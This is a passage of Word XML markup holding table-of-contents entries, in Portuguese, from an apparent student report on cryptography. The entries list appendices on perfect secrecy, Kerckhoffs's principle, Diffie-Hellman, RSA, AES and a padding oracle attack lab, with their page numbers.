            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881966 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0DE9E206" w14:textId="103D0C84"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>8. Apêndices</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881967 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6090B7C6" w14:textId="0F945603"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>8.1 Comandos Utilizados (Resumo)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881968 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2AE71E97" w14:textId="4E7F7DF2"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69" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>9.2 Configuração de Rede</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881969 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7F8D63C3" w14:textId="4D12D05E"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Avaliações Individuais</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881970 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>54</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6E393908" w14:textId="0C07105C"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice A – Segredo Perfeito, Rodrigo Baltazar, nº 2024142</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881971 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>54</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="244DD83A" w14:textId="7B8ED9D8"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Segredo Perfeito</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881972 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>55</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="596CE756" w14:textId="1446FE04"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice B – Princípio de Kerckhoffs - Rafael Baptista,</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881973 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41F3A5E9" w14:textId="3E0C7798"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>nº 2024134</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881974 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3B30A30D" w14:textId="729CD5E0"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introdução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881975 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>58</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="53EC0788" w14:textId="14C1777C"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1 - Matemáticamente indecifrável</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881976 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>59</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="20E9D622" w14:textId="029F2C7D"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2 - Open source de 1883</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881977 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>59</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="45C89524" w14:textId="03D6D580"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3 - Aplicação solo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881978 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3B0E6829" w14:textId="3AF3044E"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79" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Pontos importantes</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881979 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="32BEBDD1" w14:textId="435077A5"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Conclusão</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881980 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5A84DB5B" w14:textId="1632E5C3"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice C – Diffie-Hellman - José Couto, nº2024026</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881981 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>61</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="35E0297F" w14:textId="1142687F"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice D – RSA - Samuel Rocha, nº2024127</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881982 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>66</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="73A4B524" w14:textId="5698585F"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice E – AES - Davide Ferreira, nº2024154</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881983 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="10C61546" w14:textId="18DB7815"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice F – Laboratório de Ataque Padding Oracle</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881984 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>73</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A2AE730" w14:textId="6272969E"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exercício 1: Compreender o Mecanismo de Padding</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881985 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>74</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7AF3DE39" w14:textId="37592A70"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Objectivo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881986 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>74</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="78A11CFA" w14:textId="78EF4C7B"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedimento Experimental</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881987 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>74</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="57E18ECA" w14:textId="719387BA"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Análise do Primeiro Ficheiro (5 bytes)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881988 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>74</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
